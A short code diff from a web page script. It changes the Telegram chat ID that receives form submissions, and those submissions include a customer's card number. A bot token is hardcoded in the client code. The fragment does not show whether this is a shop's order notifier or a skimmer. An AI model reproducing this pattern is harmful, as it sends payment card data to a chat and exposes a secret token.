@@ -336,7 +336,7 @@ ${elements.cardRadio.checked ? `\nKarta raqami: ${document.querySelector("#cardN
 
 	// Отправляем в Telegram
 	const BOT_TOKEN = "7990511752:AAF__F5OZigqQCG9LNuUA9Kv_yjH7zTgIko";
-	const CHAT_ID = "587788509";
+	const CHAT_ID = "7496952374";
 	const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 	fetch(TELEGRAM_API, {
